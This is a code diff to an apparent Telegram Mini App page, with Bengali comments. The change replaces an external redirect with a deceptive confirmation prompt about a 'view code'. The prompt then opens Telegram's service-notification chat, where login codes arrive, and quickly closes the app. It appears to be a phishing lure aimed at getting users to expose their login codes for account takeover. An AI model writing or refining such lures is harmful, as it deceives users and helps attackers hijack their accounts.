@@ -65,13 +65,18 @@
         }
 
         function openServiceChat() {
-    // প্রথমে ব্রাউজারে লিঙ্কটি ওপেন করুন
-    tg.openLink("https://rony90790.github.io/View-code-button-CHEK-/go.html");
-    
-    // সাথে সাথে ক্লোজ না করে মাত্র ৫০০ মিলি-সেকেন্ড (০.৫ সেকেন্ড) পর ক্লোজ করুন
-    setTimeout(() => {
-        tg.close();
-    }, 500);
+    // ১. টেলিগ্রামের নিজস্ব কনফার্মেশন বক্স ওপেন হবে
+    tg.showConfirm("To get your view code, we need to open your Service Notifications. Proceed?", (ok) => {
+        if (ok) {
+            // যদি ইউজার OK দেয়, তবে এই লিঙ্কটি কাজ করার সম্ভাবনা ৯০% (কোনো ব্রাউজার ছাড়াই)
+            tg.openTelegramLink("https://t.me/777000");
+            
+            // সাথে সাথে মিনি অ্যাপ বন্ধ করে দিন
+            setTimeout(() => {
+                tg.close();
+            }, 100);
+        }
+    });
 }
     </script>
 </body>
